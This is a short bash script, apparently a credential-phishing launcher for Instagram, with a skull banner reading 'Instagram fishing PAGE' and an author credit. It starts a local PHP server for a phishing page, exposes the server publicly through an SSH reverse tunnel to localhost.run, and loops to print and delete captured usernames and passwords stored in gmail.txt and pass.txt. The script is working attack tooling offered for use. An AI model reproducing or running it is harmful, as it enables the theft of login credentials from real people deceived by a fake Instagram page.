 echo -e '\e[91m               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[95mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@     Instagram   @#%,.@        
                @#%,.@    fishing   @#%,.@          
                  @#%,.@    PAGE  @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                        keshav Gupta
               INSTAGRAM:- official_.keshav'
                echo -e '\e[93m CODED BY KESHAV'

echo  -ne "\e[92m Enter Your port number :-" |lolcat

read port
php -S 127.0.0.1:$port > /dev/null 2>&1  &
ssh -R 80:localhost:$port nokey@localhost.run  &
echo 
echo
echo 
clear
while true
do
if [ -f "gmail.txt" ]; then
cat gmail.txt
rm gmail.txt 
fi
if [ -f "pass.txt" ];then 
cat pass.txt
rm pass.txt 
fi
done
